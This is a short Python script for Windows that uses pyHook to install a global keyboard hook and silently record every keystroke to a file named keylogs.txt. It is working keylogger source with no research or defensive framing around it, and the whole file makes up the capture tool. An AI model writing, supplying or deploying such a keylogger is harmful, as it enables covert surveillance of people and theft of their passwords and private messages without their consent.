import pythoncom
import pyHook
import win32api
import win32con
import logging

# Set up logging to a file
logging.basicConfig(filename="keylogs.txt", level=logging.DEBUG, format='%(message)s')

def on_keyboard_event(event):
    """Called when a keyboard event is detected."""
    # Log the keystroke
    logging.debug(event.Key)
    # Return True to pass the event to other handlers
    return True

# Create an instance of the hook manager
hm = pyHook.HookManager()
# Define the keyboard event hook
hm.KeyDown = on_keyboard_event
# Set the hook
hm.HookKeyboard()
# Pump messages to keep the hook running
pythoncom.PumpMessages()